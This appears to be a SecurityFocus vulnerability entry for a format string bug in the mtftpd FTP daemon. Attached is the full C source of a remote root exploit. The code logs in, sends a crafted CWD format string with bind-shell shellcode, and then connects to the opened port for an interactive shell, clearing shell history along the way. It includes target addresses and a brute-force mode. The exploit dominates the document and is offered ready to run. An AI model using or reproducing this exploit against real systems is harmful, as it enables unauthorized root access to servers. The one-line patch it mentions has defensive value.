source: http://www.securityfocus.com/bid/12947/info

mtftpd is reported prone to a remote format string vulnerability.

Reports indicate that this issue may be exploited by a remote authenticated attacker to execute arbitrary code in the context of the vulnerable service.

This vulnerability is reported to affect mtftpd versions up to an including version 0.0.3. 

/*
 * Remote root exploit against mtfptd daemon <= 0.0.3 ( wow! )
 * http://mtftpd.sourceforge.net/ <- ALPHA RELEASE !
 * There is a format bug in the log_do() function ( log.c )
 * patch: - syslog(prd, buf); + syslog(prd, "%s", buf);
 * Maybe there are other bugs in the code (lots of strcpy) but this was
 * the funniest.
 *
 * I've seen some ppl posting useless, code-ripped, not working, 
 * lame exploits for rare daemons or tools so I decided to write 
 * my own oneday, useless, lame exploit (with ripped code naturally)
 * to post it somewhere just for fun and "glory", that's the leeto way 
 * nowadays it seems.
 * 
 * ugh! I think I'm out of date because I didn't manage to write a banner 
 * longer than the code itself. And yes, I've got time to waste...
 * 
 * kisses 2 tankie - greets: sorbo, arcangelo, jestah
 * by gunzip@ircnet - mailto: <techieone@softhome.net>
*/

#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <getopt.h>

int shell ( u_long ip );
void usage( char * a );
int die (char * error);
void handle_timeout( int s );
u_long res( char * fqhn );
int connect_to_host ( unsigned long ip , int port );
int answer( char * buf, unsigned int size, FILE * file );

char * mk_fmt_string(   unsigned int align,
                        unsigned int offset,
                        unsigned long retloc,
                        unsigned long retaddr,
                        int written );

#define ELITEBANNER 	"\nlinux/x86 mtftpd <= 0.0.3 remote root exploit by gunzip\n\n"
#define COMMAND		"unset HISTFILE; echo; uname -a; id;\n"
#define BUFSIZE		1024
#define NOP		0x41

static __inline__ void * _xmalloc(size_t size, char *function, int line) {
        void * temp;
        temp = (void *)malloc( size );
        if (!temp) {
                fprintf(stderr,"Malloc failed at [%s:%d]",function, line);
                exit(-1);
        }
	else { memset( temp, 0, size ); return( temp );
	}
}

#define xmalloc(a)      _xmalloc(a, __FUNCTION__, __LINE__)

char bind_code[]= /* ripped from www.netric.org, hi eSDee */
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\xb1\x06\x51\xb1\x01"
"\x51\xb1\x02\x51\x8d\x0c\x24\xcd\x80\xb3\x02\xb1\x02\x31\xc9\x51\x51\x51"
"\x80\xc1\x77\x66\x51\xb1\x02\x66\x51\x8d\x0c\x24\xb2\x10\x52\x51\x50\x8d"
"\x0c\x24\x89\xc2\x31\xc0\xb0\x66\xcd\x80\xb3\x01\x53\x52\x8d\x0c\x24\x31"
"\xc0\xb0\x66\x80\xc3\x03\xcd\x80\x31\xc0\x50\x50\x52\x8d\x0c\x24\xb3\x05"
"\xb0\x66\xcd\x80\x89\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0"
"\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd\x80\x31\xdb\x53\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x31\xc9\x51\x53\x8d\x0c\x24"
"\x31\xc0\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

struct targ 		{
        char * name             ;
        u_int stackpops         ;
        u_int align             ;
        unsigned char * code    ;
        u_long retloc           ;
        u_long retaddr          ;
	u_int written 		;
};
/* 
 * to get retloc objdump -R /usr/local/bin/mtftpd | grep write 
 * to get retaddr align and stackpops compile with -DDEBUG 
 * and play with gdb and syslog messages if you got time to waste... 
*/
struct targ tg[]= {
        { "Debian Woody 3.0 from sources (mtftpd-0.0.3.tar.gz)", 18, 0, 
		bind_code, 0x0804f324, 0xbffffba4, 36 },
	{ "Slackware 8.1 from sources (mtftpd-0.0.3.tar.gz)", 18, 0,
		bind_code, 0x0804f2e4, 0xbffff684, 36 },
	{ NULL, 0, 0, NULL, 0, 0 }
}; 

int main(int argc, char *argv[])
{
	u_long 	ip, brute = 0x0 ;
	u_short port = 21 ;

	char * user 	= "ftp";
	char * pass 	= "ftp@";
	char * victim 	= "127.0.0.1";

	int 	opt, len, sock, t = 0 ;

	char 	buf[ BUFSIZE ],
		nopcode[ BUFSIZE ];

	char * 	evil = (char *)xmalloc( 10000 );
	FILE * 	sockf = NULL ;

	fprintf( stderr, ELITEBANNER );
	if ( argc < 2 ) { usage( argv[0] ); exit(-1); }

        while ((opt = getopt(argc, argv, "b:u:p:w:g:P:n:a:r:hv:t:")) != EOF) {
                switch(opt)
                {
			case 'b': brute = strtoul(optarg,NULL,16); break;
			case 't': t = atoi(optarg); break;
			case 'v': victim = strdup( optarg ); break;
			case 'u': user = strdup( optarg ); break;
			case 'p': pass = strdup( optarg ); break;
                        case 'w': tg[t].written = atoi(optarg); break;
                        case 'g': tg[t].retloc = strtoul(optarg,NULL,16); break;
                        case 'P': port = atoi(optarg); break;
                        case 'n': tg[t].stackpops = atoi(optarg); break;
                        case 'a': tg[t].align = atoi(optarg); break ;
                        case 'r': tg[t].retaddr = strtoul(optarg,NULL,16); break;
                        case 'h':
                        default : usage( argv[0] ); exit( -1 ); break ;
                }
        }

	fprintf( stderr, "[+] Using target %s\n", tg[ t ].name ); 

	if ( (ip = res( victim )) == -1 )	
		die( "Bad hostname or ip." );
 
	do {
		if ( (sock = connect_to_host( ip, port )) > 0 ) {
			sockf = fdopen ( sock, "a+" );
			if ( fdopen == NULL ) die( "fdopen failed." );
		}
		else die( "Cannot connect to host." );

		fprintf( stderr, "[+] Trying to log in...\n");

        	answer( buf, BUFSIZE, sockf );
		fprintf( sockf, "USER %s\r\n", user);
        	answer( buf, BUFSIZE, sockf );
		fprintf( sockf, "PASS %s\r\n", pass);
        	answer( buf, BUFSIZE, sockf );

		if ( strstr( buf, "logged in" ) == NULL )
			die( "Cannot log in, wrong user/pwd ?" );
		else 
			fprintf( stderr, "[+] Doing the actual exploit...\n");

		fprintf( sockf, "CWD /\r\n" );
		answer( buf, BUFSIZE, sockf );

		fprintf( sockf, "CWD " );

		evil = mk_fmt_string( 	tg[ t ].align,				
                       	      		tg[ t ].stackpops,
			      		tg[ t ].retloc, 
                              		brute ? brute : tg[ t ].retaddr,
                              		tg[ t ].written
		);
		/*
 	 	 * I think shellcode can be placed elsewhere but I didn't check it
		 */
		len = 256 - strlen( "CWD " ) - strlen( tg[t].code ) - strlen( evil ) - 4;
		memset( nopcode, NOP, len );	
		nopcode[ len ] = 0 ;
		/*
	 	 * length of command line can't be more than 256 chars 
	 	 * because server checks it.. 
		 */
		fprintf( stderr, "[+] Using written=%d align=%d retaddr=0x%.08x retloc=0x%.08x nops=%d\n", 
		tg[t].written, tg[t].align, brute ? (u_int)brute : (u_int)tg[t].retaddr, (u_int)tg[t].retloc, len );

		fprintf( sockf, "%s", evil );
		fprintf( sockf, "%s", nopcode );
		fprintf( sockf, "%s", tg[t].code );
		fprintf( sockf, "\r\n" );
		fprintf( sockf, "QUIT\r\n" );
		if ( brute ) brute -= len ;
		fclose( sockf );
		close( sock );
		sleep( 1 );
	}
	while (( shell( ip ) == -1 ) && ( brute > 0xbffff000 ));
		
	fprintf( stderr, "[-] Bye\n");
	return( 0xc1a0 );
}

void handle_timeout(int sig)
{
	die( "Timeouted." );
}
int die (char * error) 
{
        fprintf(stderr, "[-] %s\n",error);
        exit( -1 );
}
u_long res(char *p) 
{
	struct hostent *	h;
   	unsigned long int 	rv;

   	if ( (rv=inet_addr(p)) != -1 ) return rv;
   	if( (h=gethostbyname(p)) != NULL )  {
        	memcpy( &rv,h->h_addr,h->h_length );
        	return ( rv );
   	}    
   	return( -1 );
}
int connect_to_host ( unsigned long ip , int port ) {
	int 			sockfd ;
  	struct sockaddr_in 	sheep ;

  	if ((sockfd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
  		return(-1);

  	sheep.sin_family = AF_INET;
  	sheep.sin_addr.s_addr = ip ;
  	sheep.sin_port = htons (port);

  	signal(SIGALRM,handle_timeout); alarm( 10 );
  
  	if ( connect(sockfd,(struct sockaddr *)&sheep,sizeof(sheep)) == -1 )
		return(-1);
  
  	alarm( 0 ); signal(SIGALRM,SIG_DFL);
  	return(sockfd);
}
int answer( char * buf, unsigned int size, FILE * file ) 
{
        static int count = 1 ;
        usleep( 1000 );
        memset( buf, 0, size );
        fgets( buf, size, file );
        return ( fprintf( stderr, "\033[32m[%d]: %s\033[0m", count++, buf ) );
}
void usage( char * a ) 
{
	int i ;
	fprintf( stderr, "Usage: %s -v victim [options]\n\n"
	"-v\tvictim ip or fqhn\n"
	"-u\tuser\n"
	"-p\tpassword\n"
	"-b\tbase retaddr for bruteforcing (ie. 0xbffffd90)\n"
        "-P\tport to connect to (default 21)\n"
        "-t\tone of the predefined targets\n"
        "-a\talign [0-3]\n"
        "-w\tnumbers of bytes already written\n"
        "-n\tnumber of stackpops (should be right)\n"
        "-r\treturn address (shellcode address)\n"
        "-g\taddress to be overwritten\n\n", a );
 	for (i = 0 ; tg[ i ].name ; i++ ) 
		fprintf ( stderr, "%d - %s\n",i,tg[ i ].name);
 	printf("\n");
}
int shell( u_long ip )
{
        int fd;
        int rd ;
        fd_set rfds;
        static char buff[ 1024 ];

        fprintf(stdout,"[+] Checking if exploit worked\n");

        if ( (fd=connect_to_host( ip, 30464 )) == -1 ) {
                fprintf( stderr, "[-] Did not worked.\n");
		return( -1 );
	}
        write(fd, COMMAND, strlen( COMMAND ));

        while(1) {
                FD_ZERO( &rfds );
                FD_SET(0, &rfds);
                FD_SET(fd, &rfds);

                if(select(fd+1, &rfds, NULL, NULL, NULL) < 1)
                        return( 0 );

                if(FD_ISSET(0,&rfds)) {
                        if( (rd = read(0,buff,sizeof(buff))) < 1)
                                die("shell(): read from stdin");
                        if( write(fd,buff,rd) != rd)
                                die("shell(): write to sock");

                }
                if(FD_ISSET(fd,&rfds)) {
                        if( (rd = read(fd,buff,sizeof(buff))) < 1)
                                die("see you next time, bye.");
                        write(1,buff,rd);
                }
        }
}

/**
 ** some stuff behind here is ripped from scut's fmtlib
 ** other stuff from formatbuilder by
 ** Frederic "Pappy" Raynal and Samuel "Zorgon" Dralet 
 ** others are by me gunzip@ircnet       
**/

#define TOWCALC(rabyte,writtenc) ( \
        (((rabyte + 0x100) - (writtenc % 0x100)) % 0x100) < 10 ? \
                ((((rabyte + 0x100) - (writtenc % 0x100)) % 0x100) + 0x100) : \
                (((rabyte + 0x100) - (writtenc % 0x100)) % 0x100) \
        )

#define OCT( b0, b1, b2, b3, addr )  { \
             b0 = (addr >> 24) & 0xff; \
             b1 = (addr >> 16) & 0xff; \
             b2 = (addr >>  8) & 0xff; \
             b3 = (addr      ) & 0xff; \
}

char * mk_fmt_string( 	unsigned int align, 
			unsigned int offset, 
			unsigned long retloc, 
			unsigned long retaddr,
			int written )
{
	int  	tow0, tow1, tow2, tow3 ;
		
	char 	* addr = (char *)xmalloc(128);
	char 	* fmt = (char *)xmalloc(516);
        char 	* buf = (char *)xmalloc(1024);
        char 	* ptr = addr ;
        
	char 	b0, b1, b2, b3 ;
	
        OCT ( b0, b1, b2, b3, retloc );

        while (( align-- ) && (align < 16 ))
                *addr++ = 0x41 ;

	*addr++ = b3 + 0 ; *addr++ = b2 ; *addr++ = b1 ; *addr++ = b0 ;
	*addr++ = b3 + 1 ; *addr++ = b2 ; *addr++ = b1 ; *addr++ = b0 ;
	*addr++ = b3 + 2 ; *addr++ = b2 ; *addr++ = b1 ; *addr++ = b0 ;
	*addr++ = b3 + 3 ; *addr++ = b2 ; *addr++ = b1 ; *addr++ = b0 ;
	
	*addr++ = 0 ;
	
        OCT ( b0, b1, b2, b3, retaddr );
        
	tow3 = TOWCALC(b3, written);	written += tow3 ;
	tow2 = TOWCALC(b2, written);	written += tow2 ;
	tow1 = TOWCALC(b1, written);	written += tow1 ;
	tow0 = TOWCALC(b0, written);	
	
        snprintf(fmt,516,
#ifdef DEBUG
        "%%%dx|%%%d$08x|%%%dx|%%%d$08x|%%%dx|%%%d$08x|%%%dx|%%%d$08x|",
#else
        "%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n",
#endif
                tow3,			offset,
                tow2,			offset + 1,
                tow1,			offset + 2,
                tow0,			offset + 3);
	
        snprintf(buf,1024,"%s%s",ptr,fmt);
	
	free(ptr);
	free(fmt);
        return(buf);
}
		/* http://members.xoom.it/gunzip */